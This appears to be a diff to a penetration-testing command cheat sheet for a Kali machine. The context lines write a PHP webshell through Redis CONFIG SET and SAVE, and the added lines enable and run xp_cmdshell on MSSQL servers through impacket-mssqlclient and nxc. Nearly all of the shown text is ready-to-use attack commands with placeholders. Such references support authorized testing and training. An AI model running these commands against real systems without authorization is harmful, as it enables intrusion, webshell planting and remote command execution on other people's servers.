@@ -90,8 +90,10 @@ Redis # 2:CONFIG SET dbfilename shell.php # Set filename to PHP file; kali-machi
 Redis # 2:SET payload "<?php system($_GET['cmd']); ?>" # Write PHP payload; kali-machine
 Redis # 2:SAVE # Save to disk, creating webshell; kali-machine
 
+MSSQL # 1:impacket-mssqlclient <domain>/<user>:<password>@<target> -windows-auth -q "enable_xp_cmdshell; xp_cmdshell 'whoami & ipconfig'" #enable and execute xp_cmdshell for command execution; kali-machine
 MSSQL # 1:impacket-mssqlclient <user>:<password>@<target> -windows-auth # Connect via impacket with Windows authentication; kali-machine
 MSSQL # 1:impacket-mssqlclient <user>:<password>@<target> # Connect with SQL Server authentication; kali-machine
+MSSQL # 1:nxc mssql <target> -u <user> -p '<password>' --query "SELECT @@version; EXEC xp_cmdshell 'whoami & ipconfig'" #execute MSSQL commands via nxc; kali-machine
 MSSQL # 1:sqsh -S <target>:<port> -U <user> -P <password> # Connect via sqsh; kali-machine
 MSSQL # 1:python3 mssqlclient.py <user>:<password>@<target> # Alternative impacket syntax; kali-machine
 MSSQL # 2:SELECT @@version; # Get SQL Server version; kali-machine
